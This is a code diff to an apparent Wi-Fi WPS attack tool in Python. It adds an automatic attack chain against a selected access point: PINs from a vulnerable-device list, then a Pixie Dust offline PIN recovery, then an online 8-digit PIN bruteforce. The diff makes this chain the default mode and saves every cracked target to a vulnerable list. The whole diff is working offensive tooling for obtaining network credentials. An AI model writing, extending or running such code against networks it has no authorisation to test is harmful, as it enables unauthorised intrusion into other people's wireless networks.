@@ -3079,11 +3079,78 @@ def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | 
     scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
     return scanner.promptNetwork()
 
+def autoAttack(interface: str, bssid: str, vuln_list_file: str,
+               network_info: dict = None, explicit_pin: str = None) -> bool:
+    """Smart auto-attack: vulnerable list PIN → Pixie Dust → online bruteforce.
+
+    When a BSSID is selected (via scan or --bssid) without explicit attack flags
+    (-P, -B, -p, -N, --pbc), this function runs the full chain automatically:
+
+      1. Check the BSSID against the 612-entry vulnerable device list (OUI match).
+         If matched, try each probable PIN.
+      2. If none worked (or no match), run Pixie Dust — send a likely PIN, capture
+         the WPS exchange, then use pixiewps to recover the PIN offline.
+      3. If Pixie Dust also failed, fall back to online 8-digit PIN bruteforce.
+
+    Returns True on success (credentials obtained), False otherwise.
+    """
+
+    generator = src.wps.generator.WPSpin()
+    success = False
+
+    # --- Step 1: Vulnerable list ---
+    algos = generator._getSuggested(bssid)
+    if algos:
+        logger.info(f'[Auto] {len(algos)} vulnerable device algorithm(s) matched — trying list PIN(s)…')
+        connection = src.wps.connection.Initialize(interface)
+        for algo in algos:
+            pin = algo.get('pin', '')
+            if pin:
+                logger.info(f'[Auto] Trying PIN \'{pin}\' ({algo["name"]})')
+                success = connection.singleConnection(bssid, pin)
+                if success:
+                    return True
+        logger.warning('[Auto] Vulnerable list PINs did not succeed')
+        try:
+            connection._cleanup()
+        except Exception:
+            pass
+
+    # --- Step 2: Pixie Dust (offline) ---
+    logger.info('[Auto] Trying Pixie Dust attack…')
+    likely_pin = explicit_pin or generator.getLikely(bssid) or '12345670'
+    connection = src.wps.connection.Initialize(interface)
+
+    saved_pixie = args.pixie_dust
+    args.pixie_dust = True
+    success = connection.singleConnection(bssid, likely_pin)
+    args.pixie_dust = saved_pixie
+
+    if success:
+        return True
+
+    logger.warning('[Auto] Pixie Dust did not recover the PIN')
+    try:
+        connection._cleanup()
+    except Exception:
+        pass
+
+    # --- Step 3: Online bruteforce ---
+    logger.info('[Auto] Falling back to online bruteforce…')
+    bf = src.wps.bruteforce.Initialize(interface)
+    bf.smartBruteforce(bssid, None)
+    return False
+
+
 def handleConnection(args):
     """Main connection logic"""
 
     network_info = {}
     success = False
+
+    # Auto mode = no explicit attack flag given
+    auto_mode = not (args.pixie_dust or args.bruteforce or args.pin
+                     or args.null_pin or args.pbc)
 
     if args.bruteforce:
         connection = src.wps.bruteforce.Initialize(args.interface)
@@ -3120,7 +3187,12 @@ def handleConnection(args):
                 elif probe_state['WPS locked']:
                     logger.warning('Target AP advertises WPS but reports setup locked (temporary lockout)')
 
-            if args.bruteforce:
+            if auto_mode:
+                success = autoAttack(
+                    args.interface, args.bssid, args.vuln_list,
+                    network_info, args.pin
+                )
+            elif args.bruteforce:
                 connection.smartBruteforce(
                     args.bssid,
                     args.pin
@@ -3132,7 +3204,7 @@ def handleConnection(args):
                 )
 
             # Save to vulnerable list
-            if success and args.pixie_dust and network_info:
+            if success and network_info:
                 src.utils.addVulnerableAP(network_info, args.vuln_list)
 
 def checkBssid(bssid: str, interface: str = None):
